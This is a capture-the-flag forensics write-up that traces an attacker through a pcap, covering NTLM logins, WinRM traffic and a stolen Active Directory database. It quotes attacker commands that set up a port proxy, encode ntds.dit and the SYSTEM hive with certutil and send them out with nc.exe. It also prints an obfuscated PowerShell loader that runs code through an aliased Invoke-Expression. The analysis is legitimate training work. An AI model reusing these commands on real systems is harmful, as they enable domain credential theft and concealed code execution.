---
type: challenge
event: pwnsec
name: Sherlock
category: forensics
note: |-
  Part 1: [[NT LAN Manager]]
  Part 2: Inspect streams to get a shellcode
  Part 3: [[WinRM]]
solved: ✅
---


Target: We have a pcap file, the flag is split into 3 parts:
- Part 1: What is the username of the first compromised user?
- Part 2: What is the final compromised user's NLTM hash?
- Part 3: We have to find ourselves

Part 1: We can find **NTLM_AUTH** request to user **poppy.evans** that has 200 response code, indicating a successful authentication.

Part 2: In the 13th stream, we have a PowerShell history and can inspect some suspicious commands:

```
netsh interface portproxy add v4tov4 listenport=8099 listenaddress=0.0.0.0 connectport=8888 connectaddress=192.168.1.91
certutil -encode "c:\tmp\Active Directory\ntds.dit" "c:\tmp\dd8d9s.b64"
certutil -encode "c:\tmp\REGISTRY\SYSTEM" "c:\tmp\n8vv63.b64"
cat c:\tmp\dd8d9s.b64 | .\nc.exe 127.0.0.1 8099
cat c:\tmp\n8vv63.b64 | .\nc.exe 127.0.0.1 8099
```

Thus, we can find the network to port `8888` of `192.168.1.91` to collect 2 `.b64` files. Next, we can decrypt `base64`  to get `ntds.dit` and `SYSTEM` files ([[Extension#NTDS.dit]]):

```python
import base64  
  
def decode_from_b64(input_string):  
return base64.b64decode(input_string)  
  
with open("ntds.b64", "r") as file:  
ntds_txt = file.read()  
  
ntds_lines = ntds_txt.splitlines()  
ntds_lines.pop(len(ntds_lines) - 1)  
ntds_lines.pop(0)  
ntds_txt = "".join(ntds_lines).strip()  
ntds_bytes = decode_from_b64(ntds_txt)  
  
with open("ntds.dit", "wb") as file:  
file.write(ntds_bytes)  
  
print("[*] Decoded NTDS.dit written to disk.")  
  
with open("system.b64", "r") as file:  
system_txt = file.read()  
  
system_lines = system_txt.splitlines()  
system_lines.pop(len(system_lines) - 1)  
system_lines.pop(0)  
system_txt = "".join(system_lines).strip()  
system_bytes = decode_from_b64(system_txt)  
  
with open("SYSTEM", "wb") as file:  
file.write(system_bytes)  
  
print("[*] Decoded SYSTEM hive written to disk.")
```

After decrypting, we have NT hash: `10602252e2d10cf3d6363d6afce8280d`

Part 3: With NT hash and [[WinRM]] traffic, we can decrypt it to get the shellcode:

```powershell
$best64code = "AZ3EWN3QzN0Y2MmNjZzQmNycTZ2kjN3cjZ1UmN1YjN3UjN" ;  
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;  
$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;  
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;  
$RandomSTR64 = '40bpN1clJHcYVULlt0b25Wa'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;  
$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;  
$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;  
$aliasSTR64 = 'ARvNEO'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;  
$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;  
$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;  
$NULl = nEw-AlIaS -Name $AliASFInal -vALue $IExCmD -FOrce ; &amp; $aLIAsfiNAl $lOAdCODe ;  
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }</S>
```

